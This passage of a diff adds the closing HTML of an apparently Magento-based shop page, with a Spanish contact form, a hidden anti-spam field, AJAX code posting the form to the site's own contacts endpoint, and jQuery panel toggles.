+                    <input name="email" id="email" title="Correo electrónico" value="" class="input-text required-entry validate-email" type="text" />
+            </li>
+            <li>
+                    <label for="telephone">Teléfono</label>
+                    <input name="telephone" id="telephone" title="Teléfono" value="" class="input-text" type="text" />
+            </li><p class="required">* Campos requeridos</p>
+        </ul>
+  </div> <!--column sixty-->
+  <div class="column fourty last">
+     <div class="padding">
+              <label for="comment">Comentario<em class="required">*</em></label>
+              <textarea name="comment" id="comment" title="Comentario" class="required-entry input-text" cols="5" rows="3"></textarea>
+              <div class="textright">
+                 
+                 <input type="text" name="hideit" id="hideit" value="" style="display:none !important;" />
+                 <button type="submit" title="Enviar" class="button btn-sent"><span>Enviar</span></button>
+		 <img src="http://juanartesano.com/skin/frontend/rwd/accord/images/mgkloading1.gif" id="loader" style="display:none;">
+              </div> <!--textright-->
+     </div> <!--padding-->
+  </div> <!--column fourty last-->
+       
+
+</form>
+<script type="text/javascript">
+//<![CDATA[
+    var formId = 'contactForm';
+    var myForm = new VarienForm(formId, true);
+    var postUrl = "http://juanartesano.com/contacts/index/post/";
+    function doAjax() {
+        if (myForm.validator.validate()) {
+            var request = new Ajax.Request(      
+            postUrl,
+            {
+                method: 'post',      
+                onLoading: function() {   
+                  document.getElementById('loader').style.display='inline';   
+                },
+                onComplete: function(transport){ // Defining Complete Callback Function                     
+                     $(formId).hide();
+                     $('formSuccess').show();       
+                     
+                },
+                parameters: $(formId).serialize(true)    // Seriallizing the form input values
+            }
+            );
+            return false;
+     
+        }
+
+    }
+  
+  new Event.observe(formId, 'submit', function(e){
+    e.stop();
+    doAjax();
+  });
+//]]>
+</script>      
+<script type="text/javascript">
+//<![CDATA[
+    //var contactForm = new VarienForm('contactForm', true);
+//]]>
+</script>
+
+<a href="javascript:void(0)" id="hideDiv1" class="slider-close"></a>
+   </div> <!--slider-email active-->
+ </div> <!--right-side-content hidden1-->
+</div> <!--#hideShow1-->
+<script language=javascript type='text/javascript'>
+
+jQuery('.show_hide').click(function(){
+            jQuery("#hideShow").show(); 
+            jQuery("#hideShow1").hide();
+        });
+
+jQuery('.show_hide1').click(function(){
+            jQuery("#hideShow1").show();
+            jQuery("#hideShow").hide(); 
+        });
+
+jQuery('#hideDiv').click(function(){
+            jQuery("#hideShow").hide(); 
+        });
+
+jQuery('#hideDiv1').click(function(){
+            jQuery("#hideShow1").hide(); 
+        });
+
+</script>
+
+      
+
+
+       
+
+<!-- Home page newsletter -->
+
+</body>
+</html>
